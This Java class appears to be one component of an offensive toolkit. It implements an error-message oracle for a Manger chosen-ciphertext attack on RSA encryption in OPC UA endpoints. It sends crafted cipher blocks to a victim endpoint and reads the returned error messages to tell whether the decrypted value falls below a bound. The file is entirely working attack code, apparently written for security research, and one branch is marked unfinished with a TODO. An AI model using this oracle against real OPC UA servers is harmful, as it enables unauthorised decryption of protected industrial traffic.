package attacks.manger.oracle;

import opcua.context.Endpoint;
import opcua.message.ErrorMessage;
import opcua.message.Message;
import opcua.message.parts.MessageType;

import java.io.IOException;
import java.util.function.Predicate;

/**
 * Simple version of an oracle that distinguishes error messages
 */
public class DistinguishableErrorOracle extends Oracle {
    private Predicate<ErrorMessage> lessThanBPredicate;

    /**
     * Constructor
     * @param endpoint Endpoint to attack
     * @param lessThanBPredicate A predicate that predicts based on an error response, whether "m<B" holds.
     * @param validCipherText The valid ciphertext to insert queried cipher blocks into
     * @param blockNumber Which cipher block to replace in the ciphertext
     * @throws OracleException
     */
    public DistinguishableErrorOracle(Endpoint endpoint, Predicate<ErrorMessage> lessThanBPredicate, byte[] validCipherText, int blockNumber) throws OracleException {
        this.lessThanBPredicate = lessThanBPredicate;
        try {
            this.setVictimProxy(new VictimProxy(endpoint, validCipherText, blockNumber));
        } catch (IOException e) {
            throw new OracleException(e);
        }
    }

    /**
     * Constructor
     * @param endpoint Endpoint to attack
     * @param lessThanBPredicate A predicate that predicts based on an error response, whether "m<B" holds.
     * @param validCipherText The valid ciphertext to insert queried cipher blocks into
     * @throws OracleException
     */
    public DistinguishableErrorOracle(Endpoint endpoint, Predicate<ErrorMessage> lessThanBPredicate, byte[] validCipherText) throws OracleException {
        this.lessThanBPredicate = lessThanBPredicate;
        try {
            this.setVictimProxy(new VictimProxy(endpoint, validCipherText));
        } catch (IOException e) {
            throw new OracleException(e);
        }
    }

    /**
     * Constructor
     * @param victimProxy Proxy object for victim endpoint and valid ciphertext
     * @param lessThanBPredicate A predicate that predicts based on an error response, whether "m<B" holds.
     */
    public DistinguishableErrorOracle(VictimProxy victimProxy, Predicate<ErrorMessage> lessThanBPredicate) {
        this.setVictimProxy(victimProxy);
        this.lessThanBPredicate = lessThanBPredicate;
    }

    /**
     * Constructor
     * @param lessThanBPredicate A predicate that predicts based on an error response, whether "m<B" holds.
     */
    public DistinguishableErrorOracle(Predicate<ErrorMessage> lessThanBPredicate) {
        this.lessThanBPredicate = lessThanBPredicate;
    }

    @Override
    public boolean checkValidity(byte[] cipherBlock) throws OracleException {
        this.incrementQueryCount();
        Message response = getVictimProxy().sendCipherBlock(cipherBlock).getResponse();
        if(response == null || response.getMessageType() != MessageType.ERR) {
            //We "guessed" a valid ciphertext
            return true;        //TODO!!!!
        }
        return lessThanBPredicate.test((ErrorMessage)response);
    }
}
